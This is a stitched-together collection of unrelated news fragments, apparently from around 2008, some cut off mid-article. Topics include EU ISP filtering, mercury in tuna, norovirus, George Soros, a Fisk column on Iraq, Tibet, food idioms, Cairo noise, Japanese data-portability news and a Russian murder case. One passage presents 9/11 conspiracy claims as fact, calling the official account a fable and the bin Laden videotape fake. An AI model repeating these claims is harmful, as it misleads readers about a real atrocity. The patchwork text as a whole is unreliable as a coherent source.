The Committee for Culture and Education will decide in January whether they want to incorporate recommendations for ISP - based filtering into a dossier about the future of cultural industries in Europe .
This in itself may sound like a small step , but the EFF Europe is already up in arms about it , calling ISP filtering " an ill - considered and damaging quick fix . "
The FDA and EPA already warn against pregnant women and children eating canned tuna because of high mercury levels , but The New York Times has discovered even more mercury in a random selection of fresh sushi tuna .
And it ’s not just those swanky city folk who are at risk .
According to one marine scientist : “ Mercury levels in bluefin [ tuna ] are likely to be very high regardless of location [ of purchase ] . ”
New York Times :
Recent laboratory tests found so much mercury in tuna sushi from 20 Manhattan stores and restaurants that at most of them , a regular diet of six pieces a week would exceed the levels considered acceptable by the Environmental Protection Agency .
Sushi from 5 of the 20 places had mercury levels so high that the Food and Drug Administration could take legal action to remove the fish from the market .
The sushi was bought by The New York Times in October .
“ No one should eat a meal of tuna with mercury levels like those found in the restaurant samples more than about once every three weeks , ” said Dr. Michael Gochfeld , professor of environmental and occupational medicine at the Robert Wood Johnson Medical School in Piscataway , N.J .

When the government announced last month that a top - secret spy satellite would , in the next few months , come falling out of the sky , American officials said there was little risk to people because satellites fall out of orbit fairly frequently and much of the planet is covered by oceans .
But they said precious little about the satellite itself .
Such information came instead from Ted Molczan , a hobbyist who tracks satellites from his apartment balcony in Toronto , and fellow satellite spotters around the world .
They have grudgingly become accustomed to being seen as “ propeller - headed geeks ” who “ poke their finger in the eye ” of the government ’s satellite spymasters , Mr. Molczan said , taking no offense .
“ I have a sense of humor , ” he said .
Mr. Molczan , a private energy conservation consultant , is the best known of the satellite spotters who , needing little more than a pair of binoculars , a stop watch and star charts , uncover some of the deepest of the government ’s expensive secrets and share them on the Internet .
Thousands of people form the spotter community .
Many look for historical relics of the early space age , working from publicly available orbital information .
Others watch for phenomena like the distinctive flare of sunlight glinting off bright solar panels of some telephone satellites .
Still others are drawn to the secretive world of spy satellites , with about a dozen hobbyists who do most of the observing , Mr. Molczan said .
Norovirus causes sudden vomiting and diarrhoea
Doctors estimate more than 100,000 people a week are catching norovirus , which causes diarrhoea and vomiting .
Workers need to remain at home for 48 hours after the symptoms have gone and stay away from surgeries and hospitals , the Royal College of GPs warned .
At least 56 hospital wards across England and Wales have been closed to new patients , the BBC has learned .
The Worcestershire Acute Hospitals
Trust says it is cancelling all non-urgent operations until 9 January because of what it calls the " unrelenting pressure " caused by the virus .
The Royal Oldham Hospital has 11 wards closed which is more than a quarter of its total and Birmingham Heartlands Hospital says six areas of the hospital are affected .
Some hospitals , including two in Bristol and one in Bedford , have told people not to visit if they have been sick or if their visit is not essential .
The Health Protection Agency confirmed the number of cases this year is the highest since 2002 .
Norovirus - also known as winter vomiting disease - is the most common cause of infectious gastroenteritis in the UK .
Wash your hands regularly so you do n't infect anyone else and stay at home two days after the symptoms have gone
Professor Steve Field
Q&A : Norovirus
' It laid everybody low '
Illness can occur at any age because immunity to it is not long - lasting .
It is not normally dangerous but the very young and very old are most at risk of complications from dehydration .
The bug can be spread by contact with an infected person , through contaminated food or water or by contact with contaminated surfaces or objects .
Outbreaks are common in hospitals , nursing homes , schools and cruise ships .
Closing hospital wards contains the virus and prevents it spreading to new patients .
' Stay home '
Professor Steve Field , chair of the Royal College of GPs said its surveillance unit in Birmingham had confirmed the number of cases was the highest in five years .
He said the number of new cases each week may even top 200,000 across the UK .
" Surgeries and hospitals have been swamped with people wanting advice . "
He advised those affected to stay at home , drink lots of fluids and take paracetamol .
NOROVIRUS
Sudden vomiting and diarrhoea
Some people also suffer fever and aches and pains Experts advise drinking plenty of fluids and to take paracetamol Stay at home for 48 hours after symptoms have gone away to avoid further spread
" Wash your hands regularly so you do n't infect anyone else and stay at home two days after the symptoms have gone . "
Dr Darren Simpson , a GP in Bradford said they had seen a large number of people with norovirus in recent weeks .
" Very few people follow the advice of staying away from work however due to unsympathetic and often nagging bosses .
" It 's the worst time of year to catch it as a lot of places are understaffed due to leave and bank holidays so there is increased pressure to attend work if you can . "
Early outbreak
In December , the Health Protection Agency warned the norovirus season had started particularly early .
They estimate that in epidemic seasons , noroviruses may cost the NHS in excess of £ 100 m per year because of ward closures .
In 2007 , the number of cases reported to the HPA in England and Wales from early September to early December were double those seen in 2006 - 1,325 compared with 685 .
The actual number of cases is much higher as most are not reported - perhaps as much as 1,500 - fold .
NHS Direct said calls about vomiting and abdominal pain had been the number two reason for people calling over the Christmas period - in keeping with reports of increased rates of norovirus .
A total of 1,122,874 people contacted the NHS helpline over the 11 - day Christmas and New Year period - a 61 % increase on last year .
Dr Mike Sadler , NHS Direct chief operating officer , said : " Call patterns have been markedly different from our previous experience . "
Nihon Uni releases a stab - proof T - shirt
Anyone who read or watched The Lord of the Rings might have found themselves envious of Frodo ’s Mithril shirt that successfully protected him from a stab wound , might be excited to know they could be able to snag the real life version .
Yet another example of science catching up with fantasy , the company Nihon Uni has created a shirt that will protect against stab wounds .
Due to an uprise in stabbings of late night store clerks and even children , they needed a lightweight way to offer a bit more security in your day to day routine .
It ’s made from a thicker fiber that is three times stronger than the cotton used for an average T - shirt .
It is made from ultrahigh molecular weight polyethylene fiber , which is equal to the aramid fiber which is used in body armor .
Conveniently the shirt is still machine washable .
It will be released in Japan in June in both a T - shirt and long sleeve form .
The long sleeve will be sold for $ 220-590 and the short - sleeved version for $ 190 - 522 .
Which means the average child or store clerk wo n’t be able to snag themselves one anytime soon .
Edit : Please not that the shirt is slash - proof not stab - proof as originally stated .

AMID increasingly turbulent credit markets and ever - weaker reports on the economy , the Federal Reserve has been unusually swift and determined in its lowering of the overnight lending rate .
The White House and Congress have moved quickly as well , approving rebates for families and tax breaks for businesses .
And more monetary easing from the Fed could well be on the way .
The central question for the economy is this :
Will this medicine work ?
The same question was asked repeatedly in Japan during its “ lost decade ” of the 1990s .
Unfortunately , as was the case in Japan , the answer may be no .
If the American economy were entering a standard cyclical downturn , there would be good reason to believe that a timely countercyclical stimulus like that devised by Washington would be effective .
But this is not a standard cyclical downturn .
It is a post - bubble recession .
The United States is now going through its second post - bubble downturn in seven years .
Yet this one stands in sharp contrast to the post - bubble shakeout in the stock market during 2000 and 2001 .
Back then , there was a collapse in business capital spending , a sector that peaked at only 13 percent of real gross domestic product .
Meanwhile , the American housing market is going into the toilet , with foreclosures at an all - time high .
The national infrastructure - roads , bridges , transportation , public works - is falling apart .
Jobs are tougher to keep and get .
The costs of food and fuel are going up .
The stock market is going down .
A college education is more and more out of reach for more and more of our young people .
About 47 million citizens are without health insurance .
The mood of many Americans ranges from nervousness to despair to panic .
“ The mood of the group was generally gloomy , but George said we were going into a serious recession , ” said Byron Wien , the chief investment strategist of Pequot Capital , a hedge fund .
Image George Soros wants to make a lasting contribution to economic understanding .

Mr. Soros was one of only two people there who predicted the American economy was headed for a recession , he said .
Shortly after that luncheon Mr. Soros began meeting with hedge fund managers like John Paulson , who was early to predict a crisis in the housing market .
He interrogated his portfolio managers and external hedge funds that manage his fund ’s money , and he took on new positions to hedge where they might have gone wrong .
His last - minute strategies contributed to a 32 percent return  or roughly $ 4 billion for the year .
The more Mr. Soros learned about the crisis , the more certain he became that he should rebroadcast his theories .
In the book , Mr. Soros , a fierce critic of the Bush administration , faults regulators for allowing the buildup of the housing and mortgage bubbles .
He envisions a time , not so distant , when the dollar is no longer the world ’s main currency and people will have a harder time borrowing money .
Mr. Soros hopes his theories will finally win the respect he craves .
But , ever the trader , he hedges his bets .
“ I may well be proven wrong , ” he said .
“ I would say that I ’m the boy who cried wolf three times . ”
Many of the people Mr. Soros wants to influence may view him with skepticism , in part because of how he made his fortune .
In 1992 , his fund famously bet against the British pound and helped force the British government to devalue the currency .
Five years later , he bet  correctly  that Thailand would be forced to devalue its currency , the baht .
The resulting bitterness toward him among Thais was such that Mr. Soros canceled a trip to the country in 2001 , fearing for his safety .
Asked if it bothers him that people accuse him of causing economic pain , his blue eyes dart around the room .
“ Yes , it does , actually yes , ” he said .
After his latest shenanigans , I 've come to the conclusion that George Bush is the first US president to march backwards .
First we had weapons of mass destruction .
Then , when they proved to be a myth , Bush told us we had stopped Saddam 's " programmes " for weapons of mass destruction ( which happened to be another lie ) .
Now he 's gone a stage further .
After announcing victory in Iraq in 2003 and " mission accomplished " and telling us how this enormous achievement would lead the 21st century into a " shining age of human liberty " , George Bush told us this week that " thanks to the surge , we 've renewed and revived the prospect of success " .
Now let 's take a look at this piece of chicanery and subject it to a little linguistic analysis .
Five years ago , it was victory – ie success – but this has now been transmogrified into a mere " prospect " of success .
And not a " prospect " , mark you , that has even been glimpsed .
No , we have " renewed " and " revived " this prospect .
" Revived " , as in " brought back from the dead " .
Am I the only one to be sickened by this obscene semantics ?
How on earth can you " renew " a " prospect " , let alone a prospect that continues to be bathed in Iraqi blood , a subject Bush wisely chose to avoid ?
Download the new Independent Premium app Sharing the full story , not just the headlines
Note , too , the constant use of words that begin with " re - " .
Renew .
Revive .
And – incredibly – Bush also told us that " we actually re-liberated certain communities " .
This , folks , goes beyond hollow laughter .
Since when did armies go around " re-liberating " anything ?
And what does that credibility - sapping " actually " mean ?
I suspect it was an attempt by the White House speech writer to suggest – by sleight of hand , of course – that Bush was really – really – telling the truth this time .
But by putting " actually " in front of " re-liberate " – as opposed to just " liberate " – the whole grammatical construction falls apart .
Rather like Iraq .
For by my reckoning , we have now " re-liberated " Fallujah twice .
We have " re-liberated " Mosul three times and " re-liberated " Ramadi four times .
The scorecard goes on .
My files show that Sadr City may have been " re-liberated " five times , while Baghdad is " re-liberated " on an almost daily basis .
General David Petraeus , in his pitiful appearance before the US Senate armed services committee , was bound to admit his disappointment at the military failure of the equally pitiful Iraqi Prime Minister Nouri al - Maliki in Basra .
He had not followed Petraeus ' advice ; which was presumably to " re-liberate " the city ( for the fourth time , by my calculation but with a bit more planning ) .
Indeed , Petraeus told senators that after his beloved " surge " goes home , the US will need a period of " consolidation and evaluation " – which is suspiciously close to saying that the US military will be , as the old adage goes , " redeployed to prepared positions " .
Ye gods !
Where will this tomfoolery end ?
In statistics , perhaps .
By chance , as Bush was speaking this week , my mail bag flopped open to reveal a letter from my old American military analyst friend , George W Appenzeller .
He gently ( and rightly ) corrects some recent comparative figures I used on US casualties in Korea , Vietnam and Iraq .
" In previous wars , " he writes , " the US army has not reported to the public the number of wounded who are treated and immediately released back to duty .
They have reported these casualties in the Iraq and Afghanistan wars " .
So here are a few Appenzeller factoids ( glossed by Fisk , so the responsibility is mine ! ) .
The correct ratios for wounded in action vs killed in action for Iraq and Afghanistan is 8.13 to 1 ; for Korea , it 's 7.38 to 1 and for Vietnam it 's 6.43 to 1 .
The true number of US wounded in Iraq until 18 March this year was 13,170 , of whom 8,904 were so badly wounded that they required air evacuation to hospitals outside Iraq .
The number of killed in action in Iraq is 3,251 .
( The other 750 died in accidents or of sickness . )
But this does not include the kind of figure that the Pentagon and Bush always keep secret : an astonishing 1,000 or more Western - hired mercenaries , killed in Iraq while fighting or killing for " our " side .
But now I 'll let George Appenzeller speak in his own words .
" There are widely ranging estimates , but roughly 450,000 individuals ... fought on the ground in Vietnam ...
At the height of the Vietnam war there were 67,000 ground combat troops there .
That is roughly the number of ground combat troops the US presently has deployed in Iraq .
Interestingly enough , that is also about the number of ground combat troops the US had fighting at any one time in the Korean war .
" The US army now has a much leaner and meaner organisation than in the past with a higher proportion of combat troops to total troops .
All those American civilian truck drivers and Bangladeshi cooks have freed up troop slots that have gone to the combat arms . "
No , Iraq has not yet reached Korea and Vietnam proportions .
The three - year Korean war resulted in 33,686 US battle deaths and about 250,000 US wounds , an average of 94,562 casualties per year .
The American phase of the Vietnam war lasted 14 years and resulted in 47,378 US battle deaths and 304,704 US wounds , an average of 25,149 casualties per year and an average of 66,792 during the four years of 1966 - 1969 , the height of American fighting .
The Iraq war has lasted five years and has resulted in 3,251 battle deaths and 29,395 wounds , an average of 6,529 casualties per year .
" Thus , the average number of killed and wounded during the Korean war was three times the total number of killed and wounded in the five years of the Iraq war .
The average number of killed and wounded during each of the most difficult years of the Vietnam war was twice the total for the five years of the Iraq war . "
Now for much more blood , the civilian variety .
According to George , " About 1,600,000 were killed in the Korean war , 365,000 ( according to American authorities ) and four million ( according to the Vietnamese government ) during the American phase of the Vietnam war , and who knows how many in Iraq .
No fewer than 250,000 , certainly . "
Not that long ago , Bush claimed that civilian fatalities in Iraq were " 30,000 more or less " – again , note the " more or less " – but I can see why these statistics matter even less for him .
It 's not just that we do n't care a damn about Iraqi lives .
We are going to care even less about Iraqi civilian casualties when we walk backwards , when we are renewing and reviving and re-liberating all over again .

Osama bin Laden : " I have already said that I am not involved in the 11 September attacks in the United States .
As a Muslim , I try my best to avoid telling a lie .
I had no knowledge of these attacks , nor do I consider the killing of innocent women , children and other humans as an appreciable act .
Islam strictly forbids causing harm to innocent women , children and other people .
Such a practice is forbidden even in the course of a battle . "
Skepticism towards the 9/11 official story reached the Australian Supreme Court this week after a lawyer asserted that the attacks were not orchestrated by Osama bin Laden during the trial of an alleged terror group in Melbourne .
" To say that this was all orchestrated by Osama bin Laden is a silly thing to do .
He ’s never claimed responsibility for it , " Remy van de Wiel QC told the Australian jury .
Unless you accept the credibility of a dodgy videotape of a fat Bin Laden doppelganger " miraculously discovered " in a house in Jalalabad by U.S. troops and pushed as authentic by the ever - honest U.S. government , then van de Wiel has a point .
Indeed , Bin Laden ’s first public statement following the 9/11 attacks was to deny any responsibility for carrying them out .
" I have already said that I am not involved in the 11 September attacks in the United States .
As a Muslim , I try my best to avoid telling a lie .
I had no knowledge of these attacks , nor do I consider the killing of innocent women , children and other humans as an appreciable act .
Islam strictly forbids causing harm to innocent women , children and other people .
Such a practice is forbidden even in the course of a battle , " Bin Laden told the Pakistani - based Ummat newspaper .
Despite the fact that it only took three months to charge him with the 1998 embassy bombings , there has been no formal indictment of bin Laden over six years after 9/11 and the FBI ’s wanted poster makes no reference of Bin Laden ’s involvement in 9/11 .
When asked by reporters why no reference was made , FBI agent Rex Tomb was forced to admit that " the FBI has no hard evidence connecting Bin Laden to 9/11 . "
Van de Wiel is the defense lawyer for Abdul Nacer Benbrika , leader of an alleged terror organization that the prosecution claims planned to carry out violent attacks in Australia .
Van de Wiel asserted that the group were incapable of organizing " a booze - up in a brewery , " and pointed out the lack of evidence against them besides the fact that they liked to " bullshit to each other . "
The case mirrors almost every other example we have studied in Britain , Canada and America , where a group of Muslims are infiltrated by security agents , radicalized and provocateured into saying something which could be perceived as advocating violence , and then arrested .
Despite the complete lack of hard evidence of intent or capability to carry out attacks , the trials provide fodder for propagandists to cite in order to hoax the public into thinking terrorists are everywhere , thus convincing them to hand over more liberty in the name of security .
As we reported last week , four prosecutors
In the Guantánamo Bay case assert that the trials are rigged and that convictions are already assured despite the fact that there is scant evidence to link Khalid Sheik Mohammed and his cohorts with 9/11 , proving that the official story is a fable and the real perpetrators are being protected .

China has offered to pay compensation to the families of the civilians it says died in violence in the Tibetan capital this month , as it keeps up an intense propaganda campaign in the wake of the unrest .
Pressure grew from abroad for China to respect human rights in its response to continuing pockets of unrest over the past two weeks in Tibet and neighbouring areas , with US President George W Bush calling on Chinese leaders to talk to representatives of Tibet 's exiled spiritual leader , the Dalai Lama .
The rash of anti-Chinese protests , and China 's response , have become a focus of global concern months before the Olympics .
Beijing hopes the games that start in August will be a chance to showcase progress in the world 's fourth biggest economy .
By the Government 's count , 18 civilians were killed during anti-Chinese violence in Lhasa on March 14 , when demonstrators hurled rocks at police and burned and looted stores and homes .
Their families would each receive 200,000 yuan ( $ 31,110 ) , a notice from Tibet 's regional government said .
Anyone injured in the chaos that engulfed in Lhasa after days of Buddhist monk - led demonstrations was entitled to free medical care , the state - run Xinhua news agency quoted it as saying .
" Measures are to be taken to help people repair their homes and shops damaged in the unrest or to build new ones , " it said .
One police officer also died , state media say , but Xinhua did not mention compensation arrangements .
The Tibet government - in - exile , established when the Dalai Lama fled to India after an abortive uprising in 1959 , has estimated that there have been 140 deaths in the violence .
Since the unrest , China has been on a propaganda offensive , attacking foreign news organisations for biased reporting , quoting Buddhist clergy condemning the riots , praising the authorities for exercising restraint and highlighting the material gains the ruling Communist Party has brought to Tibet .
It has also pinned blame for the unrest on the ' Dalai clique ' - meaning the Dalai Lama and his supporters - who it says want to disrupt the Olympics and seek Tibet independence .
The Nobel Peace Prize - winning monk , however , says he only wants greater autonomy for Tibet within China .
On Friday ( local time ) , he said China 's media were using " deceit and distortion " in coverage of the protests in Tibet , which could cause racial tension and lead to unpredictable long - term consequences .
Sit down and talk
US President Bush urged China to exercise restraint and urged the Chinese Government , led by President and Communist Party chief Hu Jintao , to meet the Dalai Lama ' representatives .
" It 's in his country 's interest that he sit down again with representatives of the Dalai Lama ... and that we urge restraint , " Mr Bush told a news conference on Friday .
China has said it is open to discussions as long as the Dalai Lama stops supporting Tibet and Taiwan independence , and ends his support for the protests and anti-Olympics activities .
Underscoring US concerns , the first senior US official scheduled to meet Chinese leaders since the protests erupted this month , Treasury Secretary Henry Paulson will raise Tibet in Beijing next week , a treasury official said .
The Olympic flame will be handed to Chinese games organisers in Athens on Sunday , and Tibetan exiles have vowed to stage protests .
Activists disrupted the torch lighting ceremony on Monday .
The flame is due to arrive in Beijing on March 31 .
China has flooded the region with troops and reports have emerged of mass detentions , monastery and school lockdowns , search - and - seizure operations and rights abuses .

When politicians talk of reforming the health care system to rein in costs , skeptical patients often worry that they will be forced to accept shoddy treatment in second - rate institutions .
So it is a relief to learn that the famed Mayo Clinic in Minnesota and the renowned Cleveland Clinic in Ohio offer outstanding care at bargain prices  at least compared with higher - priced , equally prestigious medical centers elsewhere .
The comparison comes via the latest edition of the Dartmouth Atlas of Health Care , published by Dartmouth ’s Institute for Health Policy and Clinical Practice .
Researchers there have long pointed to large disparities in medical spending in different areas of the country and shown that patients usually do no better  and often fare worse  where the spending is highest .
This year ’s atlas focuses on Medicare spending for patients in the last two years of life at the top five teaching hospitals , as ranked by U.S. News & World Report .
The medical center at the University of California , Los Angeles , was the most extravagant , averaging some $ 93,000 per patient .
Johns Hopkins , at $ 85,000 , and Massachusetts General , at $ 78,000 , came next .
The Cleveland Clinic , at $ 55,000 , and the Mayo Clinic , at $ 53,000 , were far more cost - effective .
The reason for the disparities is not that one hospital charges a lot more for a given service than the others .
Rather , the high - cost hospitals provide a lot more services for patients than the lower - cost hospitals : keeping patients in the hospital and in intensive care for longer periods , sending them to a slew of specialists and doing a lot more tests and procedures .
1. The Cold Shoulder
Believe it or not , there was a time when giving someone the cold shoulder did n't just mean publicly snubbing them , it actually meant handing them a cold shoulder , as in a cold shoulder of beef .
During the Middle Ages , the easiest way to hint to guests that they 'd overstayed their welcome was to serve them a heaping mound of cold cow parts .
A few platters of nothing but shoulder were supposed to drive away even the most persistent of guests .
2. Humble Pie
In the 13th Century , British families tended to divvy up food after a hunt by giving priority ( and the best portions of meat ) to the man who shot the stag , his eldest son and his closest male friends .
Those of lesser importance , like the man 's wife , his remaining children and the family of his friends for example , were graciously gifted the umbles ( a.k.a.
the heart , the brain , the tongue , the kidneys and the entrails ) .
Coating these scraps in seasoning and then baking them into a piecrust made the umbles a little more appetizing , but not much , apparently .
Years after the delicacy was discontinued , some punster added an " h "  to the phrase , and " to eat humble pie "  became synonymous with an embarrassing drop in social status , then generalized as any sort of humiliation .
3 . Take the cake
Lifted from Southern black lingo , the phrase originated at cakewalk contests , where individuals would strut their stuff to the audience 's delight .
The owner of the most imaginative swagger would take home first prize , which was always a cake .
While " take the cake "  became standard English , some of the fancier cakewalk motions became standard parts of tap dance .
4. Bringin ' home the bacon
What today means coming home with a wad of cash used to be a bit more literal .
In the 12th Century , the Dunmow church in Essex County , Britain , began awarding salted and cured bacon strips to newly married couples if they could swear after one year of marriage that they had never once regretted the decision .
Standards got a little stiffer in the 16th Century , however , when the church turned the event into a competition : Couples had to appear before a jury of six bachelors and bachelorettes and plead the magnitude of their happiness in order to " bring home the bacon . " 
" Eating crow " , " Gone to pot " and much more , all covered after the jump ...
5 . Gone to pot
The common phrase for something that 's fallen apart or disintegrated goes back to the 16th Century , basically in reference to things that were actually going into the pot .
While the chopping and stewing of meats and vegetables definitely illustrates its colloquial usage , " gone to pot "  evolved into a 17th - Century euphemism for those who'd fallen victim to cannibals .
6 . To eat crow
This saying , which means to humiliate oneself , has a pretty amusing legend behind it .
During a truce in the war of 1812 , a New Englander ventured over to the British camp to do some hunting .
Frustrated by the lack of wild game , he decided to shoot the first thing he saw — a crow , which he nailed .
A British officer , hearing the gunshot , decided to punish the American for trespassing , but since he was unarmed he used a bit of cunning .
The Brit complimented the American on his aim and then asked to see the fine weapon with which the damage was done .
The unsuspecting Yank handed over the weapon , after which the British officer turned it on the American , berated him and ordered him to eat a bite of the crow he 'd killed .
After a bit of useless begging , the American complied .
The officer then gave the gun back and told the American to go home .
But before the Brit could leave , the bitter Yank quickly turned the gun on the officer and forced him to eat the rest of the bird .
The tale would have gone unknown , except that the infuriated British officer went the next day to the American camp , demanding retribution .
After hearing the tale , the U.S. commanding officer had the soldier brought to him and asked him if he 'd seen this Englishmen before .
After several attempts to respond , the soldier managed to stutter , " W - why y-y - yes , Captain , I d - d - dined with him y-y - yesterday . " 
7 . A real ham
The common term for someone guilty of overacting is abbreviated from the slightly longer , and more offensive , hamfatter .
Low - grade minstrel actors often did n't have the cash to spring for cold cream , so they resorted to applying ham fat to their faces before they put their make - up on .
The fat was a viable substitute as it made removing makeup after a gig a whole lot easier .
Consequently , the facial application became permanently connected to the actors who wore it .
8. Pleased as punch
The punch in the phrase does n't refer to a tasty beverage , but instead to the main character in the old time " Punch and Judy "  puppet shows .
A staple at European carnivals , the Punch and Judy show was madly popular in the days before TV .
The humorous puppet act always ended in a pleased Punch outwitting his shrewish wife , hence the phrase .
9. A Bakers ' Dozen
Bakers of old were n't exactly the most ethical creatures .
In fact , it was pretty well known that bakers used to dupe customers regularly by making loaves of bread that contained more air pockets than solid material .
By 1266 , Parliament was fed up ( or not fed up , as it were ) with their airy substitutes , so they enacted a law where bread had to be sold by weight .
Most bakers did n't have the proper weighing equipment , but the penalties were pretty extreme .
Bakers quickly decided that forking over an extra loaf for every dozen was an easy way to avoid a sentence : hence the number 13 .
Noise  outrageous , unceasing , pounding noise  is the unnerving backdrop to a tense time in Egypt , as inflation and low wages have people worried about basic survival , prompting strikes and protests .
We ’re not just talking typical city noise , but what scientists here say is more like living inside a factory .
“ It ’s not enough to make you crazy , but it is very tiring , ” said Essam Muhammad Hussein , as he sat in a cracked plastic chair outside the corner food shop his family has owned for 50 years .
He was shouting as he talked about the noise , though he did not seem to realize it .
“ What are we going to do ? ” he asked .
“ Where is the way out ? ”
This is not like London or New York , or even Tehran , another car - clogged Middle Eastern capital .
It is literally like living day in and day out with a lawn mower running next to your head , according to scientists with the National Research Center .
They spent five years studying noise levels across the city and concluded in a report issued this year that the average noise from 7 a.m. to 10 p.m. is 85 decibels , a bit louder than a freight train 15 feet away , said Mustafa el Sayyid , an engineer who helped carry out the study .
But that 85 decibels , while “ clearly unacceptable , ” is only the average across the day and across the city .
At other locations , it is far worse , he said .
In Tahrir Square , or Ramsis Square , or the road leading to the pyramids , the noise often reaches 95 decibels , he said , which is only slightly quieter than standing next to a jackhammer .
“ All of greater Cairo is in the range of unacceptable noise levels from 7 a.m. to 10 p.m. , ” Mr. Sayyid said .

今月初め，ちょっとした事件があった。ブロガーのRobert Scoble氏が，米国の大手SNS(ソーシャル・ネットワーキング・サービス)であるFacebookから自分のデータをスクリプトによってオンラインアドレスブックのPlaxoに移行しようとしたところ，Facebookからアカウントを停止されたというのだ。スクリプトによって短時間に大量のデータを読み出そうとしたことが規約に抵触したのだという（Scoble氏のブログ「

Scoble氏が知られたブロガーだったためこの事件は話題になり，400以上のコメントやトラックバックがつき，米国の技術情報ブログTechCrunchなども取り上げた。Facebookの対応に憤慨したScoble氏が即日加入したのが，DataPortability Workgroup（データポータビリティWG ) という団体である。

Scoble氏の事件がきっかけになったのか，1月8日にはデータポータビリティWGは，Google，Facebook，Plaxoの社員が同WGに参加したと発表した(Dataportabiliy Workgroupの共同創設 者Chris Saad氏のブログ記事 「 Individuals from Plaxo , Google and Facebook join DataPortability.org Workgroup 」 )

APML はAttention Modified Markup Languageの略で，ユーザーが何に興味を持っているかというアテンション情報を他のサイトに持ち出すためのXMLデータフォーマットで，データポータビリティWGのメンバーが策定したものだ。
OpenIDは複数のサイトで同じIDを使用できる仕組みだ（関連記事）。米SixApartの社員などが役員を務めるOpenID Foundationが策定し，日本ではOpenid.ne.jpが発行サービスを行っている。
OpenIDも勢いづいている。2008年1月17日には米Yahoo!がOpenIDに対応し，Yahoo!IDで外部サイトを利用可能にすると発表した（関連記事）。これによりOpenIDアカウントの数は約3億6800万に達するという。日本のヤフーもOpenIDを発行する予定だ(関連記事）。日本ではほかにはてなやLivedoorなどがOpenIDの認証サービスを提供している。
データではなく ，Webサービス上でのアプリケーションでのロックインをオープン化しようという試みもすでに始まっている。Googleなどは2007年7月，複数のSNSで共通のアプリケーションを開発するための標準API「 Open Social」を発表した（関連記事）。MySpaceや日本のミクシィなども賛同を表明している。FacebookはSNSをOSのようなプラットフォームとして，その上でアプリケーションを開発できるようなAPIを公開，対応アプリケーションが1万3000に達し，これにより最も注目されるSNSとなった（関連記事）。Open Socialは，アプリケーションがひとつのSNSにロックインされている状況をオープン化することで，Facebookの先行を切り崩そうとするGoogleなどの戦略だ。
データポータビリテ ィWGやOpenID ，Open Socialなどの活動がどこまで実を結ぶのかはわからないが，その活動がネットやメディアの耳目を集めているのは，ユーザーのニーズがあるためだ。Facebook，MySpace，LinkedIn，orkutと米国のSNSは現在，群雄割拠の状態にある。多くのユーザーが複数のSNSのアカウントを持つ。データを持ち運びたいという欲求は切実なものなのだろう。
内閣知財戦略推進会議がSaaSのロックインを警告
日本でも ，Webサービス，特にSaaSでのロックインに関する議論が政府によって行われている。
2007 年末にまとめられた 政府の知的財産戦略本部 「 知的財産による競争力強化専門調査会」の報告書では，ASPやSaaS（Software as a Service）などにおいて，ユーザーのデータを加工して生み出されたデータの帰属があいまいであるため，ユーザーがそれを引き出すことができず，ロックインが生じる可能性を指摘している。
「 ASPやSaaSにおいては、ユーザーが提供したデータをサービス提供事業者が処理した上で蓄積することとなる。この場合、当該処理を行うソフトウェアに係る著作権が侵害されるおそれがあることを理由に当該サービス提供事業者が他の事業者へのデータの移管を拒むことにより、ユーザーが特定のサービス提供事業者と固定的な取引を余儀なくされてしまうといった問題が生じている。(政府の知的財産戦略本部「知的財産による競争力強化専門調査会」の報告書「知財フロンティアの開拓に向けて」より引用)
報告書は ， 「契約の雛型や知的財産の取扱いに関するガイドラインを早急に作成し、その普及を図る」ことが必要であると提言する。
IT産業の歴史はこれまでロックインの歴史だった。プラットフォームの上に蓄積されたソフトウエアを他のプラットフォームに容易に移行できないことが障壁となり，デファクトを握ったベンダーの地位を守った。だが，ロックインにより対等な競争が実現されないことは市場を歪め，技術やサービスの進化を阻害する要因になる。
ハードウエアによるロックインからユーザーを解き放ったのはオープンシステムと呼ばれるベンダーに依存しないアーキテクチャだった。そしてソフトウエアによるロックインという状況を変えようとしているのがオープンソースだ。しかし，現在もデスクトップOSでは，一社による寡占状況が続いている。オープンソース・ソフトウエア推進団体Open Source Initiative ( OSI ) 会長 の Michael Tiemann氏は 「 Webサービスでのデータによるロックインはあってはならない。オープンなデータ交換の標準が必要だ」と指摘する。

Newspaper advertising revenue fell 7.9 percent in 2007 , the second - worst year in more than half a century , the Newspaper Association of America said on Friday .
Those figures include continued growth in online advertising .
Until last fall , the industry appeared headed for a less severe decline .
But as the economy slowed , newspapers suffered a particularly bad fourth quarter  the peak period for ad sales  with revenue down 10.3 percent from a year earlier .
Revenue from ads in printed newspapers dropped 9.4 percent for the year , the biggest drop in any year since 1950 , the period charted by the association .
Internet ad revenue on newspaper sites rose 18.8 percent , a marked slowdown from the torrid pace of the previous three years , when it averaged 30 percent annual growth .
Online ads accounted for just 7.5 percent of all newspaper ad revenue in 2007 , evidence that it will be years before digital growth outweighs the print slump .
The European Central Bank has inflation , which reached a 3.6 percent annual pace in March , firmly in view , as required by its mandate .
The bank ’s president , Jean - Claude Trichet , said Monday in Vienna that it would set interest rates based on “ no other considerations than the delivery of price stability in the medium term . ”
In recent weeks , the tough stances of several senior bank policy makers on inflation has contributed to a broad impression that at least some officials are itching to raise interest rates as soon as tension eases in the financial markets .
Many economists say that the strength of the euro , which helps keep import prices down , has probably helped curb any rush by the bank to increase borrowing costs .
“ There is no doubt in my mind that without the financial crisis , and maybe the strong euro , they would have long since hiked rates , ” said Erik Nielsen , chief Europe economist at Goldman Sachs in London .
Like central bankers , Mr. Almunia has frequently cautioned against wage settlements that incorporate these price rises into pay scales because they increase the chances that companies will pass the costs along to consumers , fueling an inflation cycle .
But he cited Germany as one country where rising wages should bolster consumer spending after years of relying on exports for growth , a development that would help spur growth across Europe .
The commission predicted Monday that European economic growth would cool somewhat this year , to 1.7 percent in the 15 - nation euro zone , down from the 2.2 percent it forecast in the autumn .
The euro zone economy grew 2.6 percent in 2007 .
Mr. Almunia also said that the strong euro , which so far has shown little sign of pinching European growth , would eventually affect , and be amplified by , a weaker world economy .
The euro settled in New York Monday at $ 1.5645 , below its record just over $ 1.60 , but is probably still overvalued , he said .
The guy on the left in the Santa suit is responsbile for up to fifty murdered sex slaves , including his own daughter
A version of this article first appeared in the February 2008 issue of Penthouse magazine .
NIZHNY TAGIL — Last March ,
The eXile reported a story so shocking and so gruesome that it made every other item in the Russian crime catalog seem like a parking violation .
Browse Column
If you read the story , you remember it .
A mass grave containing the mutilated remains of more than a dozen teenage sex slaves was unearthed in a forest outside Nizhny Tagil , an industrial city of 400,000 just east of the southern Urals .
The young victims were linked to a local prostitution ring that had been kidnapping , enslaving and killing local girls for five years .
